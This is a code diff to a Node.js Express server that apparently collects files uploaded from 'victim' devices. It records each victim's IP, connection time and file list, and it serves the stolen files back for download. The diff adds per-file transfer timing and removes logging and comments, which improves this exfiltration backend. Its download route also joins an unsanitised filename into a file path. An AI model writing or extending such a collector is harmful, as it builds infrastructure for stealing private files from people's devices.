@@ -5,7 +5,7 @@ const express = require('express');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
+const PORT = process.env.PORT || 8080;
 
 // Enable CORS with specific options
 const corsOptions = {
@@ -77,11 +77,12 @@ app.post('/upload', (req, res) => {
     if (!connectedDevices[victimId]) {
       connectedDevices[victimId] = {
         ip: ip,
-        connectionTime: Date.now(),  // Record connection time in milliseconds
+        connectionTime: Date.now(),
         lastConnectionTime: new Date(),
         filesTransferred: 0,
-        totalUploadTime: 0, // Initialize total upload time
+        totalUploadTime: 0,
         fileList: [],
+        fileDurations: {},  // Track individual file transfer durations
       };
     } else {
       connectedDevices[victimId].lastConnectionTime = new Date();
@@ -123,6 +124,9 @@ app.post('/upload', (req, res) => {
         const endTime = Date.now();
         const uploadDuration = (endTime - startTime) / 1000; // in seconds
         connectedDevices[victimId].totalUploadTime += uploadDuration;
+
+        // Track the transfer time for this file
+        connectedDevices[victimId].fileDurations[filename] = uploadDuration;
       }
 
       res.status(200).json({ message: 'Chunk received successfully' });
@@ -143,7 +147,6 @@ app.get('/download/:victimId/:filename', (req, res) => {
   try {
     const { victimId, filename } = req.params;
 
-    // Check if victim folder exists first
     if (!victimFolders[victimId]) {
       return res.status(404).json({ error: 'Victim folder not found' });
     }
@@ -151,24 +154,17 @@ app.get('/download/:victimId/:filename', (req, res) => {
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
 
-    // Check if the file exists in the folder
     if (!fs.existsSync(filePath)) {
-      console.log(`❌ File not found at ${filePath}`);
       return res.status(404).json({ error: 'File not found' });
     }
 
-    console.log(`📂 Downloading file from: ${filePath}`);
-    
-    // Proceed to download the file
     res.download(filePath, filename, (err) => {
       if (err) {
-        console.error(`❌ Error sending file:`, err);
         return res.status(500).json({ error: 'Error sending file' });
       }
     });
 
   } catch (error) {
-    console.error(`❌ Error in download route:`, error);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
